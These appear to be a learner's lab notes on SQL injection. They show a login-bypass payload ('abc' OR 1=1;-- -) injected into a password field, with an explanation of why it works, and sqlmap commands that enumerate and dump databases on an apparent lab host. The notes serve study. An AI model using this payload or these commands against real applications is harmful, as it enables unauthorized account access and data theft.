
Example of login page :

`Username : John`

`Password : Un@detectable444`

request to the database :

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```
---
### SQL INJECTION VULNERABILITY

`Username : John`
`Password : abc' OR 1=1;-- -`

Request :
```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```
There two conditions seperate by the `OR` operator. First it check the first condition `password = 'abc'`, as the password is random , the condition will probably be false.
And it check the other condition of the is `1=1` , this statement is always true, so the query would be successfully executed and the attacked would get logged in to John's user account
The `-- -` at the end would comment anything after. 

---
### AUTOMATED SQL INJECTION TOOL

**SQLMAP**
- automated tool for detecting and exploiting sql injection vulnerabilities in web applications
- build into some Linux distributions

`sqlmap --wizard`

`--wizard` : when this flag is used, the tool will guide you through each step and askp questions to complete the scan, perfect for beginners

```shell
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```

```shell
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```

`--dbs` :fetch the databases


```shell
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```

`-D` : define a database , here `users` database

`--tables` : to extract all the table name inside the database selected ( here `users`)

```shell
sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
```

`-D` : define the database
 `-T` : define the table
 `--dump` : extract the records of the table

